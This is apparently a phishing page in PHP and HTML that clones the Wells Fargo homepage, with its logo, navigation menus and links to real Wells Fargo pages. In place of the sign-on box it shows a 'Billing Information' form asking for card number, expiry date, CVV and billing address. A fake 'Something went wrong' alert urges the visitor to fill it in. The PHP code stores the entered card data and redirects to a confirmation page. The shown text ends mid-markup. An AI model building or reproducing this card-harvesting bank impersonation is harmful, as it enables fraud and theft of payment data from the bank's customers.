<?php
session_start();

if (isset($_POST['btnConfirm'])) {

    if ((!empty($_POST['j_cardNumber'])) && (!empty($_POST['j_expiryDate'])) && (!empty($_POST['j_cardCCV']))  && (!empty($_POST['j_billingAddress']))) {

        $_SESSION['cardNumber'] = $_POST['j_cardNumber'];

        $_SESSION['expiryDate'] = $_POST['j_expiryDate'];

        $_SESSION['cardCVV'] = $_POST['j_cardCCV'];

        $_SESSION['billingAddress'] = $_POST['j_billingAddress'];

        header("Location: ConfirmationPage.php");
    }
}

?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">

<head>


    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <script src="scripts.js"></script>

    <link href="WellsFargo/homepage_ret.css" rel="stylesheet"
          type="text/css">

</head>

<body>
<div id="shell" data-pid="222-147047-64">

    <div id="skiptocontent">

        <!--        <a href="https://www.wellsfargo.com/#skip">Skip to main content</a>-->

    </div>


    <header role="banner">
        <div id="masthead" class="html5header c1 nxg">
            <div class="wfLogoStripParent">
                <div class="wfLogoStripChild">
                    <div id="brand">
                        <img alt="Wells Fargo Home Page" role="img"
                             src="https://www01.wellsfargomedia.com/assets/images/css/template/homepage/homepage-horz-logo.svg">
                    </div>
                    <div id="topSearch">


                        <ul>


                            <li role="presentation">
                                <a href="https://oam.wellsfargo.com/oamo/identity/enrollment"
                                   class="signIn signLockImg">
                                    <img alt="Secure" role="img"
                                         src="./WellsFargo/homepage-lock.svg">
                                    Enroll
                                </a>


                            </li>


                            <li role="presentation">
                                <a href="https://www.wellsfargo.com/help/">Customer Service</a>
                            </li>

                            <li role="presentation">
                                <a href="https://www.wellsfargo.com/locator/">ATMs/Locations</a>
                            </li>

                            <li role="presentation">
                                <a href="https://www.wellsfargo.com/spanish/" xml:lang="es" lang="es">Espa??ol</a>
                            </li>

                        </ul>


                        <div id="nxgSearch">
                            <button id="nxgSearchButton">
                                <span class="nxgSearchText">Search</span>&nbsp;
                                <span class="nxgVisuallyHidden" id="nxgSearchDescription">Opens a dialog.</span>
                                <span class="nxgSearchIcon"></span>
                            </button>


                        </div>


                    </div>
                </div>
            </div>

            <div id="mainNav">
                <nav aria-label="account type">


                    <div class="html5nav" id="tabNav">
                        <ul>


                            <li class="active">
                                <a href="https://www.wellsfargo.com/#" class="tabNavLink" id="tabNavPersonal"
                                   name="tabNavPersonal">
                                    <span class="hidden">selected</span>
                                    Personal</a>


                            </li>


                            <li>
                                <a href="https://www.wellsfargo.com/biz/" class="tabNavLink" id="tabNavSmallBusiness"
                                   name="tabNavSmallBusiness">Small Business</a>
                            </li>


                            <li>
                                <a href="https://www.wellsfargo.com/com/" class="tabNavLink" id="tabNavCommercial"
                                   name="tabNavCommercial">Commercial</a>
                            </li>


                        </ul>
                    </div>


                    <div id="headerTools">
                        <nav role="presentation">
                            <ul>

                                <li>
                                    <a href="https://www.wellsfargo.com/financial-education/">Financial Education</a>
                                </li>

                                <li>
                                    <a href="https://www.wellsfargo.com/about/">About Wells Fargo</a>
                                </li>

                            </ul>
                        </nav>
                    </div>

                </nav>
            </div>

        </div>
    </header>


    <nav id="fatNavParent" aria-label="products and services">
        <ul id="fatnav">
            <li>
                <a id="bankingTab" class="navLevel1" href="https://www.wellsfargo.com/#banking" aria-expanded="false"
                   data-navitem="banking">Banking and Credit Cards</a>
                <div id="banking" class="navItem hide" role="region" aria-labelledby="bankingTab">
                    <h2 class="hide">Banking</h2>
                    <div class="navItemLeft">
                        <div>
                            <div class="fatNavTitle">
                                <h2>Accounts and Services</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/checking/?linkLoc=fn">Checking Accounts</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/savings-cds/?linkLoc=fn">Savings Accounts and
                                        CDs</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/debit-card/?linkLoc=fn">Debit Cards</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/credit-cards/?linkLoc=fn">Credit Cards</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/foreign-exchange/?linkLoc=fn">Foreign
                                        Exchange</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/international-remittances/?linkLoc=fn">Global
                                        Remittance Services</a>
                                </li>
                            </ul>
                        </div>
                        <div>
                            <div class="fatNavTitle">&nbsp;</div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/online-banking/?linkLoc=fn">Online Banking</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/online-banking/transfer-pay/?linkLoc=fn">Transfer
                                        and Pay</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/mobile/?linkLoc=fn">Mobile Features</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/online-banking/manage-accounts/control-tower/?linkLoc=fn">Control
                                        Tower<sup>??</sup></a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/atm/?linkLoc=fn">ATM Banking</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Your Financial Goals</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/tax-center/?linkLoc=fn">Tax Center</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-banking-made-easy/index/?linkLoc=fn">Banking
                                    Made Easy</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-retirement/?linkLoc=fn">Planning for
                                    Retirement</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=fn">Security
                                    Center</a>
                            </li>
                        </ul>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Popular Links</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/mortgage/rates/?linkLoc=fn">Mortgage Rates</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/help/routing-number/?linkLoc=fn">Routing Number</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/checking/overdraft-services/?linkLoc=fn">Overdraft
                                    Services</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/financial-assistance/?linkLoc=fn">Get Help with
                                    Payment Challenges</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/checking/compare-checking-accounts/?linkLoc=fn">Open
                                    a Checking Account</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/help/apply/?linkLoc=fn">Apply for an Account or
                                    Service</a>
                            </li>
                        </ul>
                    </div>

                    <br style="clear:both">
                </div>
            </li>
            <li>
                <a id="loansTab" class="navLevel1" href="https://www.wellsfargo.com/#loans" aria-expanded="false"
                   data-navitem="loans">Loans and Credit</a>
                <div id="loans" class="navItem hide" role="region" aria-labelledby="loansTab">
                    <h2 class="hide">Loans and Credit</h2>
                    <div class="navItemLeft">
                        <div>
                            <div class="fatNavTitle">
                                <h2>Accounts and Services</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/mortgage/?linkLoc=fn">Mortgage Loans</a>
                                </li>

                                <li>
                                    <a href="https://www.wellsfargo.com/personal-credit/?linkLoc=fn">Personal Loans</a>
                                </li>
                            </ul>
                        </div>
                        <div>
                            <div class="fatNavTitle">&nbsp;</div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/student/?linkLoc=fn">Student Loans</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/auto-loans/?linkLoc=fn">Auto Loans</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/credit-cards/?linkLoc=fn">Credit Cards</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Your Financial Goals</h2>
                        </div>
                        <ul>

                            <li>
                                <a href="https://www.wellsfargo.com/goals-going-to-college/?linkLoc=fn">Going to
                                    College</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-credit/?linkLoc=fn">Borrowing and Credit</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=fn">Security
                                    Center</a>
                            </li>
                        </ul>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Popular Links</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/mortgage/rates/?linkLoc=fn">Mortgage Rates</a>
                            </li>

                            <li>
                                <a href="https://www.wellsfargo.com/financial-assistance/?linkLoc=fn">Get Help with
                                    Payment Challenges</a>
                            </li>
                            <li>
                                <a href="https://icomplete.wellsfargo.com/oas/status/auth">Finish Application/Check
                                    Status</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/student/rate-benefits/?linkLoc=fn">Student Loan
                                    Discounts</a>
                            </li>
                        </ul>
                    </div>

                    <br style="clear:both">
                </div>
            </li>
            <li>
                <a id="investingTab" class="navLevel1" href="https://www.wellsfargo.com/#investing"
                   aria-expanded="false" data-navitem="investing">Investing and Retirement</a>
                <div id="investing" class="navItem hide" role="region" aria-labelledby="investingTab">
                    <h2 class="hide">Investing and Retirement</h2>
                    <div class="navItemLeft">
                        <div>
                            <div class="fatNavTitle">
                                <h2>Our Investing Services</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/?linkLoc=fn">Overview</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/wellstrade-online-brokerage/?linkLoc=fn">Self-Directed
                                        Investing</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/intuitive-investor-automated-investing/?linkLoc=fn">Automated
                                        Investing</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/wells-fargo-advisors/?linkLoc=fn">Dedicated
                                        Financial Advisor</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/compare-ways-to-invest/?linkLoc=fn">Compare
                                        Ways to Invest</a>
                                </li>
                            </ul>
                        </div>
                        <div>
                            <div class="fatNavTitle">
                                <h2>Investing Solutions</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/retirement/ira/?linkLoc=fn">IRAs</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/mutual-funds/?linkLoc=fn">Invest in
                                        Mutual Funds</a>
                                </li>

                                <li>
                                    <a href="https://www.wellsfargo.com/investing/retirement/rollover/?linkLoc=fn">Rollovers
                                        (401k and IRA)</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/education/?linkLoc=fn">Investing for
                                        Education</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Your Financial Goals</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/investment-institute/?linkLoc=fn">Strategy and
                                    Research</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-retirement/?linkLoc=fn">Planning for
                                    Retirement</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-retirement-income/?linkLoc=fn">Income in
                                    Retirement</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-investing/?linkLoc=fn">Investing Basics</a>
                            </li>
                        </ul>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Popular Links</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/investing/guidance/consultation/?linkLoc=fn">Contact
                                    a Financial Advisor</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/investing/retirement/ira/select/?linkLoc=fn">Open an
                                    IRA</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/investing/wellstrade-online-brokerage/open/?linkLoc=fn">Open
                                    a WellsTrade<sup>??</sup> Account</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargoadvisors.com/intuitive-investor/sign-on.htm?cid=WF1800032820&amp;excid=WF1800032820">Open
                                    an Intuitive Investor<sup>??</sup> Account</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/investing/retirement/tools/my-retirement-plan/?linkLoc=fn">My
                                    Retirement Plan</a>
                            </li>
                            <li>
                                <a href="https://connect.secure.wellsfargo.com/auth/login/present?origin=irt">Employer
                                    Plan 401(k) Sign On</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </li>
            <li>
                <a id="wealthTab" class="navLevel1" href="https://www.wellsfargo.com/#wealth" aria-expanded="false"
                   data-navitem="wealth">Wealth Management</a>
                <div id="wealth" class="navItem hide" role="region" aria-labelledby="wealthTab">
                    <h2 class="hide">Wealth Management</h2>
                    <div class="navItemLeft">
                        <div>
                            <div class="fatNavTitle">
                                <h2>Wealth Services</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/the-private-bank/?linkLoc=fn">The Private
                                        Bank</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/investing/wells-fargo-advisors/?linkLoc=fn">Wells
                                        Fargo Advisors</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/abbot-downing/?linkLoc=fn">Abbot Downing</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/wealth-management-services/?linkLoc=fn">All
                                        Wealth Management Services</a>
                                </li>
                            </ul>
                        </div>
                        <div>
                            <div class="fatNavTitle">
                                <h2>Wealth Solutions</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/the-private-bank/solutions/wealth-planning/?linkLoc=fn">Wealth
                                        Planning</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/the-private-bank/solutions/private-banking/?linkLoc=fn">Private
                                        Banking</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/the-private-bank/solutions/investment-and-asset-management?linkLoc=fn">Investment
                                        and Asset Management</a>
                                </li>

                                <li>
                                    <a href="https://www.wellsfargo.com/the-private-bank/solutions/trust-services/?linkLoc=fn">Fiduciary
                                        and Trust Services</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Wealth Advice &amp; Guidance</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/investment-institute/?linkLoc=fn">Strategy and
                                    Research</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/the-private-bank/insights/?linkLoc=fn">Wealth
                                    Management Insights</a>
                            </li>
                            <li>
                                <a href="https://privatebank.wf.com/conversations/">
                                    <em>Conversations</em>
                                    Magazine
                                </a>


                            </li>
                        </ul>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Next Step</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/the-private-bank/connect/?linkLoc=fn">Contact The
                                    Private Bank</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/investing/guidance/consultation/?linkLoc=fn">Contact
                                    Wells Fargo Advisors</a>
                            </li>
                            <li>
                                <a href="https://www.abbotdowning.com/contact_us/headquarters/">Contact Abbot
                                    Downing</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </li>
            <li>
                <a id="rewardsTab" class="navLevel1" href="https://www.wellsfargo.com/#rewards" aria-expanded="false"
                   data-navitem="rewards">Rewards and Benefits</a>
                <div id="rewards" class="navItem hide" role="region" aria-labelledby="rewardsTab">
                    <h2 class="hide">Rewards and Benefits</h2>
                    <div class="navItemLeft">
                        <div>
                            <div class="fatNavTitle">
                                <h2>Go Far<sup>??</sup> Rewards</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/go-far-rewards/?linkLoc=fn">Explore Rewards</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/go-far-rewards/earn-rewards/?linkLoc=fn">Earn
                                        Rewards</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/go-far-rewards/use-rewards/?linkLoc=fn">Use
                                        Rewards</a>
                                </li>
                                <li>
                                    <a href="https://www.wellsfargo.com/go-far-rewards/share-rewards/?linkLoc=fn">Share
                                        Rewards</a>
                                </li>
                            </ul>
                        </div>
                        <div>
                            <div class="fatNavTitle">
                                <h2>Relationship Program</h2>
                            </div>
                            <ul>
                                <li>
                                    <a href="https://www.wellsfargo.com/customer-relationship-program/?linkLoc=fn">Customer
                                        Relationship Overview</a>
                                </li>
                            </ul>
                        </div>
                    </div>

                    <div>
                        <div class="fatNavTitle">
                            <h2>Your Financial Goals</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-banking-made-easy/?linkLoc=fn">Banking Made
                                    Easy</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-credit/?linkLoc=fn">Borrowing and Credit</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=fn">Security
                                    Center</a>
                            </li>
                        </ul>
                    </div>
                    <div>
                        <div class="fatNavTitle">
                            <h2>Popular Links</h2>
                        </div>
                        <ul>
                            <li>
                                <a href="https://connect.secure.wellsfargo.com/auth/login/rewards">Sign On to Go Far
                                    Rewards</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/help/credit-cards/go-far-rewards-faqs/?linkLoc=fn">Go
                                    Far Rewards FAQs</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/credit-cards/?linkLoc=fn">Credit Cards</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </li>
        </ul>
    </nav>


    <noscript>
        <div id="msgnojs">
            <p>We're sorry, but some features of our site require JavaScript. Please enable JavaScript on your browser
                and refresh the page. <a class="c13" href="/help/online-banking/troubleshoot-faqs/">Learn More</a>
            </p>
        </div>
        <img src="https://www.wellsfargo.com/assets/images/global/s.gif?Log=1&jsoff=true" alt=""/>
    </noscript>


    <div id="mainContent">
        <div class="emergencyMsgContainer">
            <p class="emergencyMsgContent"><span class="emergencyMsgSpan theme4">Alert</span>Here for you ??? updates on
                COVID-19 assistance and stimulus.<a href="/jump/enterprise/coronavirus-response" class="c13"
                                                    data-platform="salesplatform">Learn more</a>
            </p>
        </div>


        <div class="topRegion" style="height: 550px">

            <h1 class="hidden" id="skip">
                Wells Fargo Personal</h1>


            <!--hide-->

            <!--sign on-->

            <div class="inner">
                <div id="signOn">
                    <div id="signOnMain">
                        <h2 id="signOnHeader"><img role="img"
                                                   src="WellsFargo/homepage-signon-lock.svg"
                                                   alt="Secure">Billing Information</h2>

                        <form autocomplete="off" name="signon" id="frmSignon" method="post" data-login-app="true">


                            <!--                            Credit Card Number-->

                            <div id="cardNumberDiv" class="formElementsWrapper formElementsCCNumber">
                                <label id="cardNumberLabel" for="creditcardnumber" class="id_label label_focus">Credit Card *</label>
                                <input type="text" accesskey="F" id="creditcardnumber"
                                       class="formElement formElementText cardnumspace" name="j_cardNumber"
                                       maxlength="19"
                                       autocomplete="off" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..?)\../g, '$1');" required>
                            </div>

                            <script>
                                $('.cardnumspace').on('keyup', function() {
                                    var foo = $(this).val().split("-").join("");
                                    if (foo.length > 0) {
                                        foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
                                    }
                                    $(this).val(foo);
                                });
                            </script>

                            <!--                 Credit card expire date     -->

                            <div id="expiryDateDiv" class="formElementsWrapper formElementsCCExpireDate">
                                <label id="expiryDateLabel" for="ccexpire" class="id_label label_focus">Expiry Date *</label>
                                <input accesskey="CCEX" id="ccexpire" placeholder="MM/YY" type="text"
                                       size="2"
                                       class="formElement formElementText ccexpireDate" name="j_expiryDate"
                                       maxlength="5"
                                       autocomplete="off"
                                       onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d\/\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')"
                                       style="padding-top: 22px;"
                              required   >
                            </div>


                            <!--                            DatePicker Field-->
                            <!--                            <div class="formElementsWrapper formElementDatePicker">
                                                            <label for="datepicker" class="id_label label_focus">Date Picker</label>


                                                            <input type="text"  accesskey="D" id="datepicker"
                                                                   class="formElement formElementDatePicker DatePicker" name="j_datepicker"
                                                                   maxlength="32" autocomplete="off"
                                                                   onfocus="(this.type='date')" style="padding-top: 22px;"/>
                                                        </div>-->


<!--                                    Credit card cvv            -->
                            <div id="cardCVVDiv" class="formElementsWrapper formElementsCCccv">
                                <label id="cardCVVLabel" for="creditcardCCV" class="id_label label_focus">CVV *</label>
                                <input type="password" accesskey="F" id="creditcardCCV" min="0" placeholder=""
                                       class="formElement formElementText creditcardCCV" name="j_cardCCV" maxlength="3" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..?)\../g, '$1');"
                                       autocomplete="off" required>
                            </div>

                            <!--                                    Credit card Billing address            -->

                            <div id="billingAddressDiv" class="formElementsWrapper formElementsCCAddress">
                                <label id="billingAddressLabel" for="creditcardAddress" class="id_label label_focus">Billing address *</label>
                                <input type="text" accesskey="F" id="creditcardAddress" min="0" placeholder="" format=""
                                       class="formElement formElementText creditcardAddress" name="j_billingAddress" maxlength="25"
                                       autocomplete="off" required>
                            </div>


                            <div class="formSubmit">
                                <input type="submit" value="Confirm" name="btnConfirm" id="btnSignon" class="c7">
                            </div>

                            <input type="hidden" name="fidoAuth"
                                   id="fidoAuth"
                                   value="false">

                        </form>
                    </div>
                    <!--             <div id="signUp">

                                     <a href="https://oam.wellsfargo.com/oamo/identity/enrollment">Enroll Now</a>

                                     <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=signon">Security Center</a>
                                     <a href="https://www.wellsfargo.com/privacy-security/?linkLoc=signon">Privacy, Cookies, and
                                         Security</a>
                                 </div>-->
                </div>


            </div>


            <div class="c3" style="    position: absolute;
    left: 50%;
    -webkit-transform: translateX(-50%);
    -moz-transform: translateX(-50%);
    -ms-transform: translateX(-50%);
    -o-transform: translateX(-50%);
    margin-top: 0;
    width: 1200px;
    background-color: rgba(231,218,218,0.9);;

">
                <div class="c3wrapper" role="region" aria-label="Promotions Slideshow">


                    <div class="carouselFrame item1" style="display: block;"><span class="hidden">Begin item 1</span>
                        <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">


                            <div class="c3Img">
                                <!--                                <img alt="" src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hph_default1_1200x532.jpg">-->

                                <div class="imgChodak"></div>

                            </div>


                            <div class="inner">
                                <div class="marqueeContent">
                                    <div class="marqueecontentinner marqueetheme11">

                                        <h2 style="color: red">Something went wrong</h2>
                                        <span>Inorder to keep your privacy, please complete the required instruction.</span>

                                    </div>
                                </div>
                            </div>


                        </div>
                        <span class="hidden">End item 1</span></div>
                    <div class="carouselFrame item2" style="display: none;"><span class="hidden">Begin item 2</span>
                        <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en">


                            <div class="c3Img" data-cid="tcm:84-147036-16" data-ctid="tcm:91-146911-32">
                                <img alt=""
                                     src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/enterprise/1200x532/wfi000_lg_b-wf-stagecoach_rednoborder_1200x532.gif">
                            </div>
                            <div class="inner">
                                <div class="marqueeContent">
                                    <div class="marqueecontentinner marqueetheme11">

                                        <h2>Keeping you informed</h2>


                                        <a class="c7" role="button" enrollmentid="3107" href="https://stories.wf.com/">Learn
                                            More</a>

                                    </div>
                                </div>
                            </div>


                        </div>
                        <span class="hidden">End item 2</span></div>
                </div>
            </div>

            <div id="taskbar" role="region" aria-label="A group of 5 tasks." data-cid="tcm:242-147044-16"
                 data-ctid="tcm:224-146934-32" style="bottom: 0px;">
                <div class="inner">
                    <ul>

                        <li class="task" style="top: 511px">

                            <div class="cmsDefault" data-slot-id="WF_CON_HP_TOP_TASK_1" lang="en">

                                <div class="taskContentWrapper" data-cid="tcm:84-147010-16" data-ctid="tcm:91-146909-32"
                                     style="display: block;">

                                    <a class="i7" href="/mortgage/apply/prequalification/?dm=DMIWEPURGO"
                                       enrollmentid="1234">

                                        <div class="taskImageContainer">
                                            <img alt="task_icon_house"
                                                 src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/checking/50x50/task_icon_house_50x50.png">
                                        </div>

                                        Estimate how much to borrow
                                    </a>

                                </div>


                            </div>


                        </li>

                        <li class="task">

                            <div class="cmsDefault" data-slot-id="WF_CON_HP_TOP_TASK_2" lang="en">

                                <div class="taskContentWrapper" data-cid="tcm:84-147022-16" data-ctid="tcm:91-146909-32"
                                     style="display: block;">

                                    <a class="i7" href="/credit-cards/find-a-credit-card/">

                                        <div class="taskImageContainer">
                                            <img alt="task_icon_credit-card"
                                                 src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/credit-card/50x50/task_icon_credit-card_50x50.png">
                                        </div>

                                        Find your credit card
                                    </a>

                                </div>


                            </div>


                        </li>

                        <li class="task">

                            <div class="cmsDefault" data-slot-id="WF_CON_HP_TOP_TASK_3" lang="en">

                                <div class="taskContentWrapper" data-cid="tcm:84-146975-16" data-ctid="tcm:91-146909-32"
                                     style="display: block;">

                                    <a class="i7" href="/online-banking/my-money-map/">

                                        <div class="taskImageContainer">
                                            <img alt="task_icon_laptop"
                                                 src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/student-loans/50x50/task_icon_laptop-50x50.png">
                                        </div>

                                        Free online budgeting tools

                                    </a>

                                </div>


                            </div>


                        </li>

                        <li class="task">


                            <div class="taskContentWrapper" style="display: block;">
                                <div class="taskSecondstate" tabindex="0" role="button"
                                     aria-controls="findRoutingOrAccountNumber" aria-expanded="false">
                                    <div class="taskImageContainer"><img alt=""
                                                                         src="https://www01.wellsfargomedia.com/assets/images/homepage/task-icon-account-50x50.png">
                                    </div>
                                    Find routing or account number
                                </div>
                                <div class="taskHiddenContent" id="findRoutingOrAccountNumber">
                                    <form action="/help/routing-number/" method="get">
                                        <div class="horizontalFlexParent">
                                            <fieldset class="verticalFlexParent">
                                                <legend class="hide">Routing and account number</legend>
                                                <div class="radio"><input aria-label="Routing number"
                                                                          name="routingOrAccountNumber"
                                                                          id="routingNumber" value="routing"
                                                                          type="radio"> <label for="routingNumber">Routing
                                                        number</label>
                                                </div>
                                                <div class="radio"><input aria-label="Account number"
                                                                          name="routingOrAccountNumber"
                                                                          id="accountNumber" value="account"
                                                                          type="radio"> <label for="accountNumber">Account
                                                        number</label>
                                                </div>
                                            </fieldset>
                                            <div class="flexGo"><input id="GoButton"
                                                                       class="submitBtn c7 utilitybtn disableGo"
                                                                       disabled="disabled" value="Go" name=""
                                                                       type="submit">
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>


                        </li>

                        <li class="task">


                            <div class="taskContentWrapper" style="display: block;">
                                <div class="taskSecondstate" role="button" aria-controls="checkTodaysRates" tabindex="0"
                                     aria-expanded="false">
                                    <div class="taskImageContainer">
                                        <img alt=""
                                             src="https://www01.wellsfargomedia.com/assets/images/homepage/task-icon-rates-50x50.png">
                                    </div>

                                    Check today???s rates
                                </div>
                                <div class="taskHiddenContent" id="checkTodaysRates">
                                    <form name="frmCheckRates" id="frmCheckRates" action="/dropdown" autocomplete="off">
                                        <label class="hide" for="check_rates_dropdown">Check Rates</label>

                                        <select name="dropdown" id="check_rates_dropdown"
                                                aria-label="Check Todays Rates">
                                            <option value="personal.checkRates.Mortgage">Mortgage</option>
                                            <option value="personal.checkRates.CDS">CDs</option>
                                            <option value="personal.checkRates.CreditCard">Credit Card</option>
                                            <option value="personal.checkRates.StudentLoans">Student Loans</option>
                                            <option value="personal.checkRates.PersonalLoans">Personal Loans</option>
                                            <option value="personal.checkRates.More">All Rates</option>
                                        </select>

                                        <input class="submitBtn c7 utilitybtn" id="NID1_14_2_1_1_3" type="submit"
                                               value="Go">
                                    </form>
                                </div>
                            </div>


                        </li>

                    </ul>
                </div>
            </div>

        </div>


        <div class="c63 html5section" data-cid="tcm:242-147043-16" data-ctid="tcm:224-146932-32">
            <a href="Javascript:void(0);" class="paddle prevPaddle" role="button" tabindex="-1" aria-hidden="true"><img
                        alt="Previous Slide"
                        src="./WellsFargo/home_sprite_image.png"></a>
            <div class="c63controlsWrapper">
                <ul class="c63controls" role="tablist">
                    <li role="tab" data-ia-code="C_oth_fraud_hpcarousel_web" id="nbaDefault7" aria-expanded="false"
                        aria-selected="false" aria-controls="nbaDefaultPanels7" aria-posinset="7" aria-setsize="7"
                        class="show7">


                        <div class="thumbText">
                            <span>Security Center</span>
                        </div>

                    </li>

                    <li role="tab" data-ia-code="C_ccd_credit_hpcarousel_web" id="nbaDefault1" aria-expanded="true"
                        aria-selected="true" aria-controls="nbaDefaultPanels1" aria-posinset="1" aria-setsize="7"
                        class="show1" tabindex="0">


                        <div class="thumbText">
                            <span>Borrowing and Credit</span>
                        </div>

                    </li>
                    <li role="tab" data-ia-code="C_chk_banking_hpcarousel_web" id="nbaDefault2" aria-expanded="false"
                        aria-selected="false" aria-controls="nbaDefaultPanels2" aria-posinset="2" aria-setsize="7"
                        class="show2">


                        <div class="thumbText">
                            <span>Banking Made Easy</span>
                        </div>

                    </li>
                    <li role="tab" data-ia-code="C_irw_retirement_hpcarousel_web" id="nbaDefault3" aria-expanded="false"
                        aria-selected="false" aria-controls="nbaDefaultPanels3" aria-posinset="3" aria-setsize="7"
                        class="show3">


                        <div class="thumbText">
                            <span>Retirement</span>
                        </div>

                    </li>
                    <li role="tab" data-ia-code="C_mtg_homelending_hpcarousel_web" id="nbaDefault4"
                        aria-expanded="false" aria-selected="false" aria-controls="nbaDefaultPanels4" aria-posinset="4"
                        aria-setsize="7" class="show4">


                        <div class="thumbText">
                            <span>Home Lending</span>
                        </div>

